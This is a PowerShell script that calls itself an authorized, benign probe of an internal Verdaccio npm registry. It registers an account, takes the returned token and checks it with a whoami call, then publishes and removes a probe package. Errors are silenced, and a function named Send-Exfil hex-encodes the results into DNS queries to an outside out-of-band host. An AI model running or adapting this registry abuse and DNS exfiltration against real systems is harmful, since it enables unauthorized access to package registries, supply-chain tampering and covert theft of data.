# Benign Verdaccio token/publish probe for authorized CodeRabbit VDP research (ireniumsecurity).
# Publishes only a NEW non-scoped probe package, then unpublishes it. Touches no existing package.
$ErrorActionPreference = 'SilentlyContinue'
$OAST = 'dbiemtt54sq43hh9eomg5wg85auknd4ek.oast.live'
$R = "$env:NPM_CONFIG_REGISTRY"
if (-not $R) { $R = 'http://10.64.0.28:4873' }
$R = "$R".TrimEnd('/')
$out = [ordered]@{}

function Send-Exfil([string]$s) {
    try {
        $h = -join ([System.Text.Encoding]::UTF8.GetBytes($s) | ForEach-Object { $_.ToString('x2') })
        for ($i = 0; $i -lt $h.Length -and $i -le 480; $i += 48) {
            $chunk = $h.Substring($i, [Math]::Min(48, $h.Length - $i))
            try { [System.Net.Dns]::GetHostAddresses("pse-$([int]($i/48))-$chunk.$OAST") | Out-Null } catch {}
        }
    } catch {}
}

$user = 'crvdp' + (-join (1..6 | ForEach-Object { '0123456789abcdef'[(Get-Random -Maximum 16)] }))
$tok = ''
try {
    $reg = @{ name = $user; password = "CrVdp-$user-9x!" } | ConvertTo-Json -Compress
    $resp = Invoke-WebRequest -Uri ($R + '/-/user/org.couchdb.user:' + $user) -Method Put -Body $reg -ContentType 'application/json' -UseBasicParsing -SkipHttpErrorCheck -TimeoutSec 6
    $out.reg = "$([int]$resp.StatusCode)"
    try { $tok = [string](($resp.Content | ConvertFrom-Json).token) } catch {}
} catch { $out.reg = 'ERR' }
$out.tok = $tok.Length

if ($tok.Length -gt 0) {
    # whoami via registry API (Bearer)
    try {
        $w = Invoke-WebRequest -Uri ($R + '/-/npm/v1/user') -Headers @{ Authorization = ('Bearer ' + $tok) } -UseBasicParsing -SkipHttpErrorCheck -TimeoutSec 6
        $out.who = "$([int]$w.StatusCode):" + $w.Content.Substring(0, [Math]::Min(50, $w.Content.Length))
    } catch { $out.who = 'ERR' }

    # publish a NEW non-scoped package with the npm CLI + token in .npmrc
    $pkg = 'crvdp-probe-' + $user
    $ver = '0.0.0-crvdp'
    $tmp = Join-Path ([IO.Path]::GetTempPath()) ('crnpm-' + $user)
    New-Item -ItemType Directory -Path $tmp -Force | Out-Null
    ('{"name":"' + $pkg + '","version":"' + $ver + '","description":"benign probe"}') | Set-Content -Path (Join-Path $tmp 'package.json') -Encoding utf8
    $authLine = ($R -replace '^https?:', '') + '/:_authToken=' + $tok
    Set-Content -Path (Join-Path $tmp '.npmrc') -Value $authLine -Encoding utf8
    Push-Location $tmp
    $pubOut = (npm publish --registry $R --tag crvdp-probe 2>&1 | Out-String)
    Pop-Location
    $out.npmpub = $pubOut.Substring(0, [Math]::Min(90, $pubOut.Length))
    if ($pubOut -match '\+ ' -or $pubOut -match 'published') {
        Push-Location $tmp
        $unOut = (npm unpublish $pkg --force --registry $R 2>&1 | Out-String)
        Pop-Location
        $out.npmdel = $unOut.Substring(0, [Math]::Min(60, $unOut.Length))
    }
}

Send-Exfil (($out | ConvertTo-Json -Compress))
